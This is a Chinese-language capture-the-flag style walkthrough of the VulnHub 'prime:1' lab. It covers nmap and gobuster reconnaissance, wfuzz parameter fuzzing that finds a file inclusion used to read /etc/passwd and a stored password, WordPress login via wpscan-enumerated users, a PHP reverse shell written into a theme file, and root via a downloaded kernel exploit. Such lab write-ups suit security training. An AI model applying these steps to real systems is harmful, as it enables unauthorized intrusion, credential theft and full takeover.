靶场实战：prime1

ta3shi
2025-06-08
靶场实战
linux提权, vulnhub靶场, 靶场实战

靶场地址prime:1

端口发现

sudo nmap 192.168.1.0/24 -sn扫描主机
192.168.1.101为目标ip
扫描端口sudo nmap -p- --min-rate=10000 192.168.1.101 -oA nmapscan/ports并将结果留档

开放了22和80两个端口，使用tcp扫描一下详细信息
sudo nmap -sT -sC -sV -O 192.168.1.101 -p22,80 -oA nmapscan/detail

使用nmap默认漏洞脚本扫描一下
sudo nmap --script=vuln -p22,80 192.168.1.101 -oA nmapscan/vuln

最后再扫描一下udp相关端口，确保不会错过信息
sudo nmap -sU --top-ports 20 192.168.1.101 -oA nmapscan/udp

目录爆破

可以用多个工具尝试并对比
这里用gobuster扫了一下

有个dev看看是什么

另外扫描的结果和vuln的结果都指向存在一个word-press
此外可以尝试指定扩展名爆破

扫到一个奇怪的txt，打开看看

开始渗透

模糊测试

根据刚刚扫描的结果，存在两个php页面即image.php和index.php，这里使用一个模糊测试工具测试参数
sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.101/index.php?FUZZ=aa
sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.101/image.php?FUZZ=aa -c将输出结果彩色显示，-w指定字典
出现了951个结果都是200的

可以看到大部分都是12word的，我们用hw过滤一下12w的，对两个php页面都尝试一下

image.php没有返回结果

而index.php返回了一个file，说明file就是我们想要的参数

这里说我们找对了方向，但是文件错误，根据之前提示，尝试location.txt

这里提示我们用secrettier360作为参数在另外的php页面,即image.php

按照前面在index上的file，猜测会不会是文件读取，尝试读取passwd文件

这里成功读取了该文件，说明这里存在文件包含
saket:x:1001:1001:find password.txt file in my directory:/home/saket:注意到这个用户，这里说他的家目录下有password.txt，尝试查看

得到一个follow_the_ippsec密码，尝试登录
使用所有账户登录未果，先记录下来后面再利用

WordPress扫描

首先使用wpscan进行扫描
sudo wpscan --url http://192.168.1.101/wordpress -e u
使用man wpscan可以获取wpscan的帮助，这里用-e u指定暴露用户


这里扫描出了一个victor用户，尝试用该用户和前面的密码登录后台victor/follow_the_ippsec,前面扫描时也出现了/wordpress/wp-admin/,该路径即为后台地址

获得wordpress后台权限

成功登录后台
wordpress可利用的点主要是插件，主题
简单测试一下插件是否可以上传，先写个一句话，然后打包成zip

Unable to create directory wp-content/uploads/2025/06. Is its parent directory writable by the server?
提示插件不可上传

在主题编辑下找到一个secret.php，里面的内容提升，终于你找到一个可以写的文件了，说明必然是该文件可以利用了，结合上期的php反弹shell脚本

这里两个脚本用哪个都可以
现在问题是找这个主题的路径，根据前面wpscan扫描的结果

可知最终路径为http://192.168.1.101/wordpress/wp-content/themes/twentynineteen/secret.php

成功获取www-data的用户权限

权限提升

尝试sudo和suid提权无果
定时任务也没有可以写入的文件
尝试内核提权，先查看内核版本信息

用searchsploit搜索一下相关信息

后两个是提权的，我们下载第二个来看看
里面提示直接gcc编译运行即可，我们用python起一个http服务，python -m http.server之后在靶机上用wget下载到/tmp下即可

之后运行45010

已经成功提权了

总结

首先在目录扫描得到提示用fuzz，fuzz之后获得了一个文件包含，按照提示得到一个密码，并用该密码和测试出来的wordpress用户进入了wordpress的后台，再后台找到一个可以写入的php文件，写入反弹shell从而获得一个www的用户权限，最终利用内核提权拿到root权限。
